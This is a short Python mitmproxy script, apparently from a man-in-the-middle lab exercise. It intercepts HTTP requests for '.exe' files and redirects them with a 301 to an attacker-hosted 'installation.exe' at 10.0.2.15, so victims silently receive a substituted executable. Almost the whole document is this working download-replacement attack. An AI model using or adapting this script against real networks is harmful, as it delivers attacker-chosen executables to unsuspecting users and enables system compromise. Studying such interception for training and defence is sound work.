import mitmproxy

def request(flow):
	if flow.request.host != "10.0.2.15" and flow.request.pretty_url.endswith(".exe"):
		flow.response = mitmproxy.http.Response.make(301, "", {"Location" : "http://10.0.2.15/installation.exe"})
		

#def response(flow):
#	print("response....")
#	print(flow)

